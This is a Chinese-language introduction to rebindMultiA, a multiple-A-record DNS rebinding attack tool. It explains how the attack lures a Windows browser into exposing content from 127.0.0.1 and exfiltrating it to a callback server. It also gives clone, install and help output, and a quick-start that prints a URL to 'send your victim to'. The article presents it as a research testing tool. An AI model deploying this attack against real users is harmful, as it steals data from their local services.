![](https://image.3001.net/images/20230615/1686817502_648acade607c853c25997.png!small)

## 关于rebindMultiA

rebindMultiA是一款功能强大的多重A记录重绑定攻击测试工具，该工具可以帮助广大研究人员通过针对目标域名执行多重A记录重绑定攻击，来测试目标域名或地址的安全情况。

工具提供了一个rebindmultia.com域名，用来帮助广大研究人员使用该工具来进行测试实践。它会让每一个IP地址都成为[IP].ns.rebindmultia.com域名的权威域名服务器。比如说，13.33.33.37.ns.rebindmultia.com权威域名服务器为13.33.33.37.ip.rebindmultia.com，并解析为13.33.33.37。

## 多重A记录重绑定攻击

多重A记录重绑定攻击是DNS重新绑定的一种变体，它能够允许攻击者在响应DNS请求时使用两个IP地址进行响应，并让浏览器在第一个IP没有响应时回退到DNS响应中的第二个IP。在此次攻击中，攻击者将配置一个恶意DNS服务器和两个恶意HTTP服务器。DNS服务器将使用两个A记录进行响应：

    
    
    127.0.0.1.target.13.33.33.37.ns.rebindmultia.com. 0 IN A 13.33.33.37
    
    127.0.0.1.target.13.33.33.37.ns.rebindmultia.com. 0 IN A 127.0.0.1

接下来，目标浏览器将连接到第一个IP，并开始与攻击者的第一个恶意HTTP服务器进行交互。此服务器将以包含两个iframe的页面作为响应，一个指向/steak，另一个指向/rebind。/steake
iframe将加载一个恶意页面，以访问第二个iframe并获取内容。/rebind端点在被击中时，将发出302重定向到/并终止第一个恶意HTTP服务器的运行。因此，当浏览器返回到攻击者的HTTP服务器时，它将遇到一个关闭的端口。因此，它将回退到第二个IP。一旦目标内容被加载到第二个iframe中，第一个ifame就可以访问它，窃取数据，并将其过滤到攻击者的第二个恶意HTTP服务器——回调服务器。

此攻击仅适用于Windows环境。Linux和Mac将首先默认为私有IP，并且永远不会查询攻击者的服务器。

## 工具运行机制

![](https://image.3001.net/images/20230615/1686817518_648acaee49fceff74b501.jpg!small)

## 工具安装

由于该工具基于Python 3开发，因此我们首先需要在本地设备上安装并配置好Python
3环境。接下来，广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/Rhynorater/rebindMultiA.git

然后使用pip3命令和项目提供的requirements.txt文件安装该工具所需的依赖组件：

    
    
    pip3 install -r requirements.txt

## 工具使用

使用--help命令可以直接查看工具的帮助选项：

    
    
    python3 server.py --help
    
    
    usage: server.py [-h] [-p PORT] [-c CALLBACK_PORT] [-d DNS_PORT] [-f FILE] [-l LOCATION]
    
     
    
    optional arguments:
    
      -h, --help            显示工具帮助信息和退出
    
      -p PORT, --port PORT  指定目标IP的端口，默认为80
    
      -c CALLBACK_PORT, --callback-port CALLBACK_PORT
    
                            指定回调HTTP服务器的端口，默认为31337
    
      -d DNS_PORT, --dns-port DNS_PORT
    
                            指定DNS服务器端口，默认为53
    
      -f FILE, --file FILE  指定HTML文件来显示第一个iframe，默认为steal.html
    
      -l LOCATION, --location LOCATION
    
                            指定需要从目标设备上窃取数据的地址，默认为/

如果你遇到如下所示的错误信息：

    
    
    ┬─[justin@RhynoDroplet:~/p/rebindMultiA]─[14:26:24]─[G:master=]
    
    ╰─>$ python3 server.py
    
     
    
    Traceback (most recent call last):
    
      File "server.py", line 2, in <module>
    
        from http.server import HTTPServer, BaseHTTPRequestHandler, ThreadingHTTPServer
    
    ImportError: cannot import name 'ThreadingHTTPServer'

请尝试使用更新版本的Python 3.7+环境。

## 快速使用

下列命令需要在一台可以被公共访问的IP主机上执行：

    
    
    git clone https://github.com/Rhynorater/rebindMultiA
    
    cd rebindMutliA
    
    pip3 install -r requirements.txt
    
    echo "Send your victim to http://127.0.0.1.target.`curl -s http://ipinfo.io/ip`.ns.rebindmultia.com/parent to exfil 127.0.0.1"
    
    sudo python3 server.py

## 项目地址

 **rebindMultiA** ：【[
_GitHub传送门_](https://github.com/Rhynorater/rebindMultiA)】

